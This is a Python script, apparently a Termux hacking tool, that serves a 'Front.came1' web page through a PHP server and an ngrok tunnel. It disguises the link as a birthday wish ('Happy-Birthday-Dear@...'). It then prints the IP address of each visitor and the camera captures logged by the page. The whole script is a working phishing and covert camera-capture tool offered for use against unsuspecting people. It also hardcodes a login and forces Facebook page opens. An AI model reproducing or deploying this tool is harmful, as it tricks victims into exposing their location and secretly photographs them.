import os,json,time,sys
os.system('clear')
print('\033[1;31m<<<<Chaking requirments>>>>')
print()
print()
os.system("pkg install php")
os.system('pkg install ruby')
os.system('gem install lolcat')
try:
    import requests
except:
    os.system('pip install requests')
os.system('clear')
os.system("lolcat calar.py")
# -*- coding: utf-8 -*-
import os,time
os.system("clear")
logo=""" \033[1;94m$$$$$$\  $$$$$$$\  $$$$$$\ $$$$$$$\  
\033[1;94m$$  __$$\ $$  __$$\ \_$$  _|$$  __$$\ 
\033[1;94m$$ /  $$ |$$ |  $$ |  $$ |  $$ |  $$ |
\033[1;94m$$$$$$$$ |$$$$$$$\ |  $$ |  $$$$$$$  |
\033[1;94m$$  __$$ |$$  __$$\   $$ |  $$  __$$< 
\033[1;94m$$ |  $$ |$$ |  $$ |  $$ |  $$ |  $$ |
\033[1;94m$$ |  $$ |$$$$$$$  |$$$$$$\ $$ |  $$ |
\033[1;94m\__|  \__|\_______/ \______|\__|  \__|

\033[1;93m        HELLO I AM ABIR HOSSAIN
\033[1;92m╔══════════════════════════════════════════════╗
\033[1;92m║AUTHOR      : ABIR HOSSAIN                    ║
\033[1;92m║FACEBOOK    : Abir Hossain                    ║
║GITHUB      : https://github.com/ABIRHOSSAIN10║
\033[1;92m╚══════════════════════════════════════════════╝     """
cusr = "ABIRHOSSAIN"
cpwd = "4b1r"
def ABIR():
    os.system("clear")
    print(logo)
    print()
    usr=input(" \033[1;96m ENTER USERNAME :  \033[1;95m")
    if usr == cusr:
        HOM()
    else:
        os.system("clear")
        print(logo)
        print()
        print("  \033[1;96mENTER USERNAME : \033[1;95m "+usr+"  \033[1;91m(wrong)")
        time.sleep(1)
        os.system('xdg-open https://facebook.com/Abir-Hossain-104247341997068/?substory_index=0')
        ABIR()
def HOM():
    os.system("clear")
    print(logo)
    print()
    print("  \033[1;96mENTER USERNAME :  \033[1;95mABIRHOSSAIN \033[1;92m (correct)")
    pwd=input("  \033[1;96mENTER PASSWORD :  \033[1;95m")
    if pwd == cpwd:
        GO()
    else:
        os.system("clear")
        print(logo)
        print()
        print("  \033[1;96mENTER USERNAME :  \033[1;95mABIRHOSSAIN  \033[1;92m(correct)")
        print("  \033[1;96mENTER PASSWORD : \033[1;95m "+pwd+"  \033[1;91m(wrong)")
        time.sleep(1)
        os.system('xdg-open https://facebook.com/Abir-Hossain-104247341997068/?substory_index=0')
        HOM()
    
def GO():
    os.system("clear")  
    print(logo)
    print()
    print(" \033[1;96m ENTER USERNAME : \033[1;95m ABIRHOSSAIN \033[1;92m (correct)")
    print("\033[1;96m  ENTER PASSWORD : \033[1;95m 4b1r \033[1;92m (correct)")
    print()
    print(" \033[1;92mLogin Successfull\033[0m")  
    os.system('xdg-open https://facebook.com/Abir-Hossain-104247341997068/?substory_index=0')
    time.sleep(1)
if __name__=="__main__":
    ABIR()
os.system("clear")
def slowprint(s):
 	  for c in s + '\n':
 	      sys.stdout.write(c)
 	      sys.stdout.flush()
 	      time.sleep(0.0006/ 100)
blue= '\33[1;94m'
lightblue = '\033[1;94m'
website='Front.came1'
red = '\033[1;91m'
yellow = '\33[1;93m'
white='\033[1;97m'
green = '\033[1;32m'
cyan  = "\033[1;96m"
parple='\033[1;95m'
os.system("chmod +x Abir/ngrok*")
os.system("killall ngrok> /dev/null 2>&1 || killall ngrok> /dev/null 2>&1")
os.system("killall php> /dev/null 2>&1")
os.system("lolcat calar.py")
os.system("cd site/"+website+"/ && php -S 127.0.0.1:8080> /dev/null 2>&1 &")
os.system("./Abir/ngrok http 127.0.0.1:8080> /dev/null 2>&1 &")
time.sleep(5)
print(cyan+'['+white+'+'+cyan+']' +green+' Starting php Server...')
time.sleep(5)
print()
print(cyan+'['+white+'+'+cyan+']' +green+' Starting Ngrok Server...')
time.sleep(5)
os.system("clear")
url = "http://localhost:4040/api/tunnels/"
res = requests.get(url)
res_unicode = res.content.decode("utf-8")
res_json = json.loads(res_unicode)
for i in res_json["tunnels"]:
    if i['name'] == 'command_line':
        pr=i['public_url']
try:
    prop=pr
    oldurl = 'Happy-Birthday-Dear@'+prop
    newurl = oldurl.replace('https://','').rsplit(" ", 1)[0]
except:
	print(yellow+'['+white+'×'+yellow+']' +red+' Error Link Not Genarated Try Agin')
	exit()
os.system('clear')
os.system('lolcat calar.py')
print(cyan+'Your Link Is : '+green+'https://'+newurl+'/wish.php')
print()
print(cyan+'['+white+'+'+cyan+']' +parple+' For Save Image To Gallary Command : '+yellow+' cd site/Front.came1 && ls ')
print()
print(cyan+'['+white+'+'+cyan+']' +parple+' Now Copy Image Path To Image Path.png : '+yellow+' mv image path.png /sdcard ')
print()
print()
print(cyan+'['+yellow+'+'+cyan+']' +green+' For stop this process press CTRL+Z...')
print()
while True:
	if os.path.isfile("site/"+website+"/ip.txt")==True:
		jop=open("site/"+website+"/ip.txt","r")
		ip2=jop.readline()
		ip=jop.readline().strip("IP:")
		print(blue+"\n [√]Someone Visited the Site ip address: "+yellow+ip)
		print()
		jop.close()
		print()
		os.system("rm -rf site/"+website+"/ip.txt")
	if os.path.exists("/site/"+website+"/Log.log")==True:
		f=open("/site/Front.came1/Log.log",'r')
		for line in f:
			print()
			print(cyan+'['+yellow+'+'+cyan+']' +green+'Came File '+line)
		os.system("rm -rf site/"+website+"/Log.log")